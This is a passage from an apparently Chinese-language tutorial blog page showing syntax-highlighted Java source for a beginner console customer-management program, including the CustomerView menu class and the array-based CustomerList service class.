class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.p2.ui;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.atguigu.p2.bean.Customer;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.p2.service.CustomerList;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.p2.util.CMUtility;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project12</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 主模块，菜单显示，处理用户操作</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-28 17:12</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomerView</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">CustomerList</span> <span class="variable">customerList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomerList</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CustomerView</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//默认有一个</span></span><br><span class="line">        <span class="type">Customer</span> <span class="variable">customer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Customer</span>(<span class="string">&quot;王涛&quot;</span>, <span class="string">&#x27;男&#x27;</span>, <span class="number">23</span>, <span class="string">&quot;13212341234&quot;</span>, <span class="string">&quot;wt@gmail.com&quot;</span>);</span><br><span class="line">        customerList.addCustomer(customer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Description</span>: 《显示客户信息管理软件》界面的方法</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Author</span>: kkx</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Date</span>: 2022/1/4</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Param</span>: []</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>: void</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">enterMainMenu</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isFlag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (isFlag)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;\n-----------------客户信息管理软件-----------------\n&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;                   1 添 加 客 户&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;                   2 修 改 客 户&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;                   3 删 除 客 户&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;                   4 客 户 列 表&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;                   5 退       出\n&quot;</span>);</span><br><span class="line">            System.out.print(<span class="string">&quot;                   请选择(1-5)：&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">char</span> <span class="variable">menu</span> <span class="operator">=</span> CMUtility.readMenuSelection();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (menu)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                    addNewCustomer();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                    modifyCustomer();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                    deleteCustomer();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">                    listAllCustomers();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">                    System.out.print</span><br><span class="line">                            (<span class="string">&quot;确认是否退出(Y/N)：&quot;</span>);</span><br><span class="line">                    <span class="type">char</span> <span class="variable">isExit</span> <span class="operator">=</span> CMUtility.readConfirmSelection();</span><br><span class="line">                    <span class="keyword">if</span> (isExit == <span class="string">&#x27;Y&#x27;</span>) &#123;</span><br><span class="line">                        isFlag = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Description</span>: 添加客户的操作</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Author</span>: kkx</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Date</span>: 2022/1/4</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Param</span>: []</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>: void</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">addNewCustomer</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------------添加客户---------------------&quot;</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> CMUtility.readString(<span class="number">10</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line">        <span class="type">char</span> <span class="variable">gender</span> <span class="operator">=</span> CMUtility.readChar();</span><br><span class="line">        System.out.print(<span class="string">&quot;年龄：&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> CMUtility.readInt();</span><br><span class="line">        System.out.print(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">phone</span> <span class="operator">=</span> CMUtility.readString(<span class="number">13</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;邮箱：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">email</span> <span class="operator">=</span> CMUtility.readString(<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//包装</span></span><br><span class="line">        <span class="type">Customer</span> <span class="variable">customer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Customer</span>(name, gender, age, phone, email);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isSuccess</span> <span class="operator">=</span> customerList.addCustomer(customer);</span><br><span class="line">        <span class="keyword">if</span> (isSuccess)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;---------------------添加完成---------------------&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;-------------------客户目录已满，添加失败---------------&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Description</span>: 修改客户的操作</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Author</span>: kkx</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Date</span>: 2022/1/5</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Param</span>: []</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>: void</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">modifyCustomer</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------------修改客户---------------------&quot;</span>);</span><br><span class="line">        <span class="comment">//这两个放外面是因为后面在循环外要调用</span></span><br><span class="line">        <span class="type">int</span> number;</span><br><span class="line">        Customer cust;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">            System.out.print(<span class="string">&quot;请选择待修改客户编号(-1退出)：&quot;</span>);</span><br><span class="line">            number = CMUtility.readInt();</span><br><span class="line">            <span class="keyword">if</span> (number == -<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            cust = customerList.getCustomer(number - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (cust == <span class="literal">null</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;无法找到指定客户！&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改客户信息</span></span><br><span class="line">        System.out.print(<span class="string">&quot;姓名(&quot;</span> + cust.getName() + <span class="string">&quot;):&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> CMUtility.readString(<span class="number">10</span>, cust.getName());</span><br><span class="line">        System.out.print(<span class="string">&quot;性别(&quot;</span> + cust.getGender() + <span class="string">&quot;):&quot;</span>);</span><br><span class="line">        <span class="type">char</span> <span class="variable">gender</span> <span class="operator">=</span> CMUtility.readChar(cust.getGender());</span><br><span class="line">        System.out.print(<span class="string">&quot;年龄(&quot;</span> + cust.getAge() + <span class="string">&quot;):&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> CMUtility.readInt(cust.getAge());</span><br><span class="line">        System.out.print(<span class="string">&quot;电话(&quot;</span> + cust.getPhone() + <span class="string">&quot;):&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">phone</span> <span class="operator">=</span> CMUtility.readString(<span class="number">13</span>, cust.getPhone());</span><br><span class="line">        System.out.print(<span class="string">&quot;邮箱(&quot;</span> + cust.getEmail() + <span class="string">&quot;):&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">email</span> <span class="operator">=</span> CMUtility.readString(<span class="number">30</span>, cust.getEmail());</span><br><span class="line"></span><br><span class="line">        <span class="type">Customer</span> <span class="variable">newCust</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Customer</span>(name, gender, age, phone, email);</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isReplaced</span> <span class="operator">=</span> customerList.replaceCustomer(number - <span class="number">1</span>, newCust);</span><br><span class="line">        <span class="keyword">if</span> (isReplaced)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;---------------------修改完成---------------------&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//没有机会执行</span></span><br><span class="line">            System.out.println(<span class="string">&quot;---------------------修改失败---------------------&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Description</span>: 删除客户的操作</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Author</span>: kkx</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Date</span>: 2022/1/5</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Param</span>: []</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>: void</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">deleteCustomer</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------------删除客户---------------------&quot;</span>);</span><br><span class="line">        <span class="type">int</span> number;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">            System.out.print(<span class="string">&quot;请选择待删除客户编号(-1退出)：&quot;</span>);</span><br><span class="line">            number = CMUtility.readInt();</span><br><span class="line">            <span class="keyword">if</span> (number == -<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Customer</span> <span class="variable">customer</span> <span class="operator">=</span> customerList.getCustomer(number -<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (customer == <span class="literal">null</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;无法找到指定客户！&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//找到了指定的客户，开始修改</span></span><br><span class="line">        System.out.print(<span class="string">&quot;确认是否删除(Y/N)：&quot;</span>);</span><br><span class="line">        <span class="type">char</span> <span class="variable">isDelete</span> <span class="operator">=</span> CMUtility.readConfirmSelection();</span><br><span class="line">        <span class="keyword">if</span> (isDelete == <span class="string">&#x27;Y&#x27;</span>)&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">deleteSuccess</span> <span class="operator">=</span> customerList.deleteCustomer(number - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (deleteSuccess)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;---------------------删除完成---------------------&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//没有机会执行</span></span><br><span class="line">                System.out.println(<span class="string">&quot;---------------------删除失败---------------------&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Description</span>: 显示客户列表的操作</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Author</span>: kkx</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Date</span>: 2022/1/4</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Param</span>: []</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>: void</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">listAllCustomers</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------------------客户列表---------------------------\n&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">total</span> <span class="operator">=</span> customerList.getTotal();</span><br><span class="line">        <span class="keyword">if</span> (total == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;没有客户记录！&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;编号\t姓名\t性别\t年龄\t电话\t\t邮箱&quot;</span>);</span><br><span class="line">            Customer[] custs = customerList.getAllCustomers();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; custs.length; i++) &#123;</span><br><span class="line">                <span class="type">Customer</span> <span class="variable">cust</span> <span class="operator">=</span> custs[i];</span><br><span class="line">                System.out.println((i + <span class="number">1</span>) + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;\t&quot;</span> + cust.getName() +</span><br><span class="line">                        <span class="string">&quot;\t&quot;</span> + cust.getGender() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;\t&quot;</span> + cust.getAge() +</span><br><span class="line">                        <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;\t&quot;</span> + cust.getPhone() + <span class="string">&quot;\t&quot;</span> + cust.getEmail());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------------------客户列表完成-------------------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">CustomerView</span> <span class="variable">view</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomerView</span>();</span><br><span class="line">        view.enterMainMenu();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Customer-管理"><a href="#Customer-管理" class="headerlink" title="Customer 管理"></a>Customer 管理</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.p2.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.atguigu.p2.bean.Customer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project12</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Customer管理</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-28 17:11</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomerList</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Customer[] customers;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> total;          <span class="comment">//记录存储的客户的个数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Description</span>: 构造器，用来初始化customers数组</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Author</span>: kkx</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Date</span>: 2021/12/28</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Param</span>: [totalCustomer] 指定customers数组的最大空间</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>:</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CustomerList</span><span class="params">(<span class="type">int</span> totalCustomer)</span>&#123;</span><br><span class="line">        customers = <span class="keyword">new</span> <span class="title class_">Customer</span>[totalCustomer];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Description</span>: 添加指定的客户到数组中</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Author</span>: kkx</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Date</span>: 2021/12/28</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Param</span>: [customer]</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>: boolean 是否添加成功</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">addCustomer</span><span class="params">(Customer customer)</span>&#123;</span><br><span class="line">        <span class="comment">//小于最大则可以添加</span></span><br><span class="line">        <span class="keyword">if</span> (total &lt; customers.length)&#123;</span><br><span class="line">            customers[total] = customer;</span><br><span class="line">            total++;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Description</span>: 修改指定索引位置上的客户信息</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Author</span>: kkx</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Date</span>: 2021/12/28</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Param</span>: [index, cust]</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>: boolean 是否修改成功</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">replaceCustomer</span><span class="params">(<span class="type">int</span> index, Customer cust)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= total)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        customers[index] = cust;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Description</span>: 删除指定索引位置上的客户信息</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Author</span>: kkx</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Date</span>: 2022/1/4</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Param</span>: [index]</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>: boolean 是否删除成功</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">deleteCustomer</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= total)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> index; i &lt; total - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            customers[i] = customers[i + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//这里先把最后那个指向null，total再--</span></span><br><span class="line">        customers[--total] = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Description</span>: 获取所有客户的客户信息</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Author</span>: kkx</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Date</span>: 2022/1/4</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Param</span>: []</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>: com.atguigu.p2.bean.Customer[]</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> Customer[] getAllCustomers()&#123;</span><br><span class="line">        Customer[] custs = <span class="keyword">new</span> <span class="title class_">Customer</span>[total];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; total; i++) &#123;</span><br><span class="line">            custs[i] = customers[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> custs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Description</span>: 返回指定索引位置上的Customer</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Author</span>: kkx</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Date</span>: 2022/1/4</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Param</span>: [index]</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>: 如果找到元素，则返回，如果没有找到，返回null</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> Customer <span class="title function_">getCustomer</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= total)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> customers[index];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Description</span>: 获取存储的客户的数量</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Author</span>: kkx</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Date</span>: 2022/1/4</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Param</span>: []</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>: int</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getTotal</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Customer-类"><a href="#Customer-类" class="headerlink" title="Customer 类"></a>Customer 